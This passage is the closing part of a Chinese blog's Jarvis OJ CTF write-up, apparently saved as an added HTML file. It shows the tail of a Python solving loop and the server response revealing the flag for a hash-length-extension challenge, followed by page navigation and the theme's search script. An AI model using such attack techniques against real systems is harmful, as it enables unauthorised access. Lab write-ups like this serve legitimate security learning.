ret:</div><div class="line">        <span class="keyword">print</span> ret</div><div class="line">        <span class="keyword">break</span></div></pre></td></tr></table></figure>
+<p>得到回显：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">12</div><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Web 350<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="css"></span></div><div class="line">	<span class="selector-tag">body</span> &#123;</div><div class="line">		<span class="attribute">background</span>:gray;</div><div class="line">		<span class="attribute">text-align</span>:center;</div><div class="line">	&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">h3</span>&gt;</span>Welcome Admin. Your flag is PCTF&#123;H45h_ext3ndeR_i5_easy_to_us3&#125; <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>同时也可以知道 salt 的长度为12。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    Cyris
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://iCyris.github.io/2017/11/04/jarvisoj-wp/" title="Jarvis OJ Writeup">https://iCyris.github.io/2017/11/04/jarvisoj-wp/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/10/27/code-leakage/" rel="next" title="Web源码泄漏总结">
+                <i class="fa fa-chevron-left"></i> Web源码泄漏总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/12/22/pwnhub-密码学专场/" rel="prev" title="【pwnhub 密码学专场】warmup1 & asymmetric1">
+                【pwnhub 密码学专场】warmup1 & asymmetric1 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/cyris.png"
+               alt="Cyris" />
+          <p class="site-author-name" itemprop="name">Cyris</p>
+           
+              <p class="site-description motion-element" itemprop="description">知言养气，抓住有味。</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">20</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">18</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/iCyris" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                    
+                      GitHub
+                    
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.zhihu.com/people/icyris/activities" target="_blank" title="知乎">
+                  
+                    <i class="fa fa-fw fa-pencil-square-o"></i>
+                  
+                    
+                      知乎
+                    
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web部分"><span class="nav-text">Web部分</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Login"><span class="nav-text">0x01 Login</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-api调用"><span class="nav-text">0x02 api调用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-神盾局的秘密"><span class="nav-text">0x03 神盾局的秘密</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-flag在管理员手里"><span class="nav-text">0x04 flag在管理员手里</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cyris</span>
+</div>
+
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    Gemini
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
